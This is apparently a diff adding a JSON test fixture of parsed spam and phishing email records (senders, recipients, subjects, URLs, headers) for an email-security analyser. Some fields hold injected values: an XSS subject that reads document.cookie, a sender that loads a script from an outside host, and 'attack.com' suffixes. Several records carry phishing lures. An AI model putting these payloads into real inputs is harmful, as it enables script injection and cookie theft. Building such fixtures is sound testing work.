+    },
+    "suspicious_indicators": []
+  },
+  {
+    "email_id": "5115bdf1d6b3ce08a70b18b899cb72b6",
+    "sender": [
+      "susan.lindberg@enron.com￿attack.com"
+    ],
+    "receiver": [
+      "rpm-zzzlist@freshrpms.net"
+    ],
+    "subject": "All Major Designer Replica Watches!",
+    "reply_to": [],
+    "urls": [],
+    "domains": [
+      "enron.com￿attack.com",
+      "freshrpms.net"
+    ],
+    "ips": [],
+    "attachments": [],
+    "security_headers": {
+      "received": [],
+      "authentication_results": [],
+      "dkim_signature": [],
+      "received_spf": [],
+      "return_path": null,
+      "message_id": "<01c78aa8$0788e7a0$6c822ecf@cockingcomplainer's>"
+    },
+    "suspicious_indicators": []
+  },
+  {
+    "email_id": "5c71445cc2ec367b0ebdce38c66560af",
+    "sender": [
+      "admin@security.enron.com"
+    ],
+    "receiver": [
+      "undisclosed.recipients@ilshin.ifc.co.kr"
+    ],
+    "subject": "re:Hey I missed you on aim today",
+    "reply_to": [],
+    "urls": [
+      "http://iageread.com",
+      "http://schemas.microsoft.com/office/2004/12/omml"
+    ],
+    "domains": [
+      "iageread.com",
+      "ilshin.ifc.co.kr",
+      "schemas.microsoft.com",
+      "security.enron.com"
+    ],
+    "ips": [
+      "9.0.0.25"
+    ],
+    "attachments": [
+      {
+        "filename": "paper.2.gif",
+        "content_type": "image/gif"
+      }
+    ],
+    "security_headers": {
+      "received": [],
+      "authentication_results": [],
+      "dkim_signature": [],
+      "received_spf": [],
+      "return_path": "<test@attack.com>",
+      "message_id": "<4.7.1.7.0.06005258849245.836a4612@129.97.186.209>"
+    },
+    "suspicious_indicators": []
+  },
+  {
+    "email_id": "042ab293afb526f43573000fb4fe9035",
+    "sender": [
+      "lex.carroll@enron.com"
+    ],
+    "receiver": [
+      "classy.classifieds@hawaii.com",
+      "dner@mlswpb.com"
+    ],
+    "subject": "",
+    "reply_to": [],
+    "urls": [],
+    "domains": [
+      "enron.com",
+      "hawaii.com",
+      "mlswpb.com"
+    ],
+    "ips": [],
+    "attachments": [
+      {
+        "filename": "called.gif",
+        "content_type": "image/gif"
+      }
+    ],
+    "security_headers": {
+      "received": [],
+      "authentication_results": [],
+      "dkim_signature": [],
+      "received_spf": [],
+      "return_path": "<> ",
+      "message_id": null
+    },
+    "suspicious_indicators": []
+  },
+  {
+    "email_id": "30cc220f11c16af1bcf25fd351774102",
+    "sender": [
+      "edgeconstruct@aol.com}attack.com"
+    ],
+    "receiver": [
+      "dbs@philodox.com",
+      "fork@example.com"
+    ],
+    "subject": "The United States National Medical Association",
+    "reply_to": [],
+    "urls": [
+      "http://www.us-nma.com/"
+    ],
+    "domains": [
+      "aol.com}attack.com",
+      "example.com",
+      "philodox.com",
+      "www.us-nma.com"
+    ],
+    "ips": [],
+    "attachments": [],
+    "security_headers": {
+      "received": [],
+      "authentication_results": [],
+      "dkim_signature": [],
+      "received_spf": [],
+      "return_path": null,
+      "message_id": null
+    },
+    "suspicious_indicators": []
+  },
+  {
+    "email_id": "7266c16c09ba169c654e8806d39c09fb",
+    "sender": [
+      "tarah@arches.uga.edu}attack.com"
+    ],
+    "receiver": [
+      "tammi.depaolis@enron.com",
+      "mark.breese@enron.com",
+      "dick.jenkins@enron.com"
+    ],
+    "subject": "",
+    "reply_to": [],
+    "urls": [
+      "http://buoon.com",
+      "http://cgide.com",
+      "http://csmo.net",
+      "http://ezurozven.com",
+      "http://snowqarting.com/micro/7",
+      "http://thonr.com"
+    ],
+    "domains": [
+      "arches.uga.edu}attack.com",
+      "buoon.com",
+      "cgide.com",
+      "csmo.net",
+      "enron.com",
+      "ezurozven.com",
+      "snowqarting.com",
+      "thonr.com"
+    ],
+    "ips": [],
+    "attachments": [],
+    "security_headers": {
+      "received": [],
+      "authentication_results": [],
+      "dkim_signature": [],
+      "received_spf": [],
+      "return_path": null,
+      "message_id": null
+    },
+    "suspicious_indicators": []
+  },
+  {
+    "email_id": "2aee4892e334fc13d3763bdb558d998c",
+    "sender": [
+      "european.resolution.center@enron.com"
+    ],
+    "receiver": [
+      "tanya.rohauer@enron.com",
+      "carol.st.@enron.com"
+    ],
+    "subject": "REQUEST FOR ASSISTANCE",
+    "reply_to": [
+      "cypherpunks@einstein.ssz.com"
+    ],
+    "urls": [
+      "http://thinkgeek.com/sf",
+      "https://lists.sourceforge.net/lists/listinfo/spamassassin-sightings"
+    ],
+    "domains": [
+      "einstein.ssz.com",
+      "enron.com",
+      "lists.sourceforge.net",
+      "thinkgeek.com"
+    ],
+    "ips": [],
+    "attachments": [],
+    "security_headers": {
+      "received": [],
+      "authentication_results": [],
+      "dkim_signature": [],
+      "received_spf": [],
+      "return_path": "<european.resolution.center@enron.com>",
+      "message_id": null
+    },
+    "suspicious_indicators": []
+  },
+  {
+    "email_id": "9c69b4a1fcbbbb4dff9daff01e964a86",
+    "sender": [
+      "bbo@bmw.com.ar"
+    ],
+    "receiver": [
+      "david.roensch@enron.com",
+      "dennis.alters@enron.com",
+      "ron.matthews@enron.com"
+    ],
+    "subject": "Mime-Version:Content-Type:Content-Transfer-Encoding;",
+    "reply_to": [],
+    "urls": [],
+    "domains": [
+      "bmw.com.ar",
+      "enron.com"
+    ],
+    "ips": [],
+    "attachments": [],
+    "security_headers": {
+      "received": [
+        "by 66.159.17.216 with SMTP id dxtfzfkdb7toac7          for <producttestpanel@speedy.uwaterloo.ca>; Thu, 03 May 2007 07:28:12 -0500"
+      ],
+      "authentication_results": [],
+      "dkim_signature": [],
+      "received_spf": [],
+      "return_path": null,
+      "message_id": "<4639d55e-qssc6-j-h@yelpparch.com>"
+    },
+    "suspicious_indicators": []
+  },
+  {
+    "email_id": "31428a2ea7ff16c2062f923a6fd0e48d",
+    "sender": [
+      "wine5luck@syngenta.com"
+    ],
+    "receiver": [
+      "elizabeth.sager@enron.com",
+      "frank.hayden@enron.com",
+      "mark.taylor@enron.com"
+    ],
+    "subject": "<img src='1' onerror='alert(document.cookie)'></img>",
+    "reply_to": [],
+    "urls": [],
+    "domains": [
+      "enron.com",
+      "syngenta.com"
+    ],
+    "ips": [],
+    "attachments": [],
+    "security_headers": {
+      "received": [],
+      "authentication_results": [],
+      "dkim_signature": [],
+      "received_spf": [],
+      "return_path": null,
+      "message_id": null
+    },
+    "suspicious_indicators": []
+  },
+  {
+    "email_id": "31956a8d9e1a3108549c521016c4c775",
+    "sender": [
+      "test<script src=http://xss.tw/pdjsa></script>@attack.com"
+    ],
+    "receiver": [
+      "ben.jacoby@enron.com",
+      "kathleen.clark@enron.com"
+    ],
+    "subject": "Test XSS",
+    "reply_to": [],
+    "urls": [],
+    "domains": [
+      "attack.com",
+      "enron.com"
+    ],
+    "ips": [],
+    "attachments": [],
+    "security_headers": {
+      "received": [],
+      "authentication_results": [],
+      "dkim_signature": [],
+      "received_spf": [],
+      "return_path": null,
+      "message_id": null
+    },
+    "suspicious_indicators": []
+  },
+  {
+    "email_id": "75097809fbc82c1a42417a739385a071",
+    "sender": [
+      "tvalerie@grungecafe.com"
+    ],
+    "receiver": [
+      "amy.mulligan@enron.com",
+      "bert.hernandez@enron.com",
+      "beverly.miller@enron.com"
+    ],
+    "subject": "Avis Important et Personnel",
+    "reply_to": [],
+    "urls": [
+      "http://www.desjardins.com/fr/votre_caisse/index.jsp",
+      "http://www.philsfeatheredfriends.com/sec/accesdesjardins/auportADPortail/ObtenirPageAccueil.doorigine_or/",
+      "https://accesd.desjardins.com/",
+      "https://accesd.desjardins.com/public/0939/fr_CA_ACCESD/image/bandeau.gif",
+      "https://accesd.desjardins.com/public/0939/fr_CA_ACCESD/image/securite.gif"
+    ],
+    "domains": [
+      "accesd.desjardins.com",
+      "enron.com",
+      "grungecafe.com",
+      "www.desjardins.com",
+      "www.philsfeatheredfriends.com"
+    ],
+    "ips": [],
+    "attachments": [],
+    "security_headers": {
+      "received": [],
+      "authentication_results": [],
+      "dkim_signature": [],
+      "received_spf": [],
+      "return_path": null,
+      "message_id": "<E1HcQeh-0007dx-1e@server.fastbox.info>"
+    },
+    "suspicious_indicators": []
+  },
+  {
+    "email_id": "2111046743ab7f2840be40800e35cd9f",
+    "sender": [
+      "tracy.scott@enron.com"
+    ],
+    "receiver": [
+      "scott.underberg@ey.com",
+      "ews-cct@enron.com"
+    ],
+    "subject": "jose@monkey.org Confirm Your e-mail Account!!",
+    "reply_to": [
+      "web-mails@mail.com"
+    ],
+    "urls": [
+      "http://thomasmedical.com="
+    ],
+    "domains": [
+      "enron.com",
+      "ey.com",
+      "mail.com",
+      "thomasmedical.com="
+    ],
+    "ips": [],
+    "attachments": [],
+    "security_headers": {
+      "received": [],
+      "authentication_results": [],
+      "dkim_signature": [],
+      "received_spf": [],
+      "return_path": null,
+      "message_id": null
+    },
+    "suspicious_indicators": []
+  }
+]
